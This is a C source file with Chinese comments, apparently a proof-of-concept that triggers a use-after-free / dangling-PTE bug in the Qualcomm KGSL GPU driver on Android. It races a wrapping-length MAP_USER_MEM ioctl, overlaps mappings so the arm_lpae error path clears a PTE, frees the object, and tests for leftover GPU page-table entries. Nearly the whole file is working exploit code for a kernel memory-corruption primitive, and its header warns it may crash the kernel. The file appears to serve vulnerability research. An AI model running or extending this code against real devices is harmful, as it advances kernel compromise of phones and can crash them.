/*
 * k3_dangling.c — 判定悬垂 PTE 是否已产生（RCA 步骤 6 的最小化验证）
 *
 * 逻辑链：
 *   [1-3] 按 RCA 建立 UAF / BOGUS / PLACEHOLDER，racer 插入回绕条目并失败返回
 *   [4]   主线程 mmap OVERLAP → 期望走 arm_lpae_map_sg，命中 UAF 已有 PTE
 *         → arm_lpae_init_pte 返回 -EEXIST 但 ms.num_pte++ 仍执行
 *         → out_err 用多算的 num_pte 去 unmap → 清掉 UAF 首 PTE (0x7001ff000)
 *   [5]   GPUOBJ_FREE(UAF) → __arm_lpae_unmap 在首个清零 PTE 处提前退出
 *         → 0x7001ff000 之后的 PTE 残留（悬垂）
 *   [6]   在 0x700200000（原 UAF 内部）新建对象并 mmap：
 *         - 失败 ENOMEM → 该处仍有 PTE → 悬垂 PTE 已产生（命中）
 *         - 成功        → 无残留 → 漏洞路径未生效（未命中）
 *
 * 风险：本程序刻意走到 RCA 步骤 6，可能触发内核崩溃。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/dangling.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL
#define NEWMAP_ADDR   0x0000000700200000ULL /* 原 UAF 内部 */

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_us() / 1000.0,
		     buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

struct race_state {
	volatile int ready;
	volatile long result;
	volatile int saved_errno;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");
	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = WRAP_SIZE;
	req.hostptr = BOGUS_START;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	return NULL;
}

static int alloc_obj(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al))
		return -1;
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0, new_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0, new_ms = 0;
	void *p, *bogus, *ph;
	size_t k;
	struct race_state rs;
	pthread_t th;
	struct kgsl_gpuobj_free fr;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== dangling test start pid=%d =====", getpid());
	sync_log();

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	if (alloc_obj(UAF_SIZE, &uaf_id, &uaf_ms) ||
	    alloc_obj(OVERLAP_SIZE, &ov_id, &ov_ms)) {
		lg("alloc FAIL errno=%d", errno);
		return 1;
	}
	lg("UAF id=%u size=0x%llx / OVERLAP id=%u size=0x%llx", uaf_id,
	   (unsigned long long)uaf_ms, ov_id, (unsigned long long)ov_ms);

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);
	lg("[1-3] UAF mmap+touch+munmap OK");

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;

	if (alloc_obj(PLACEH_SIZE, &ph_id, &ph_ms)) {
		lg("PLACEHOLDER alloc FAIL");
		return 1;
	}
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)ph)[0] = 1;
	lg("BOGUS VMA + PLACEHOLDER OK");

	memset(&rs, 0, sizeof(rs));
	rs.result = -1;
	pthread_create(&th, NULL, racer, &rs);
	rs.ready = 1;
	pthread_join(th, NULL);
	lg("racer 返回 ret=%ld errno=%d", rs.result, rs.saved_errno);
	sync_log();

	lg("[4] 主线程 mmap OVERLAP");
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	e = errno;
	lg("[4] OVERLAP mmap → %s errno=%d (%s)",
	   p == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
	sync_log();

	lg("[5] GPUOBJ_FREE(UAF) —— 若首 PTE 已被清零，unmap 会提前退出留下悬垂 PTE");
	memset(&fr, 0, sizeof(fr));
	fr.id = uaf_id;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr))
		lg("[5] free FAIL errno=%d", errno);
	else
		lg("[5] free OK");
	sync_log();

	lg("[6] 在原 UAF 内部 0x%llx 新建并 mmap（判据：失败 ENOMEM = 悬垂 PTE 存在）",
	   (unsigned long long)NEWMAP_ADDR);
	if (alloc_obj(PAGE, &new_id, &new_ms) == 0) {
		void *q = mmap((void *)(uintptr_t)NEWMAP_ADDR, (size_t)new_ms,
			       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
			       fd, (off_t)new_id << 12);
		e = errno;
		lg("[6] new mmap → %s errno=%d (%s)",
		   q == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
		sync_log();
		lg("---- 判定 ----");
		if (q == MAP_FAILED && e == ENOMEM)
			lg("verdict: 悬垂 PTE 已产生（该地址仍有残留 PTE）→ 漏洞路径已生效");
		else if (q != MAP_FAILED)
			lg("verdict: 无残留 PTE → 漏洞路径未生效（需重新设计触发）");
		else
			lg("verdict: 其他 errno=%d", e);
	} else {
		lg("[6] alloc FAIL errno=%d", errno);
	}

	sync_log();
	lg("===== end =====");
	sync_log();
	close(fd);
	return 0;
}
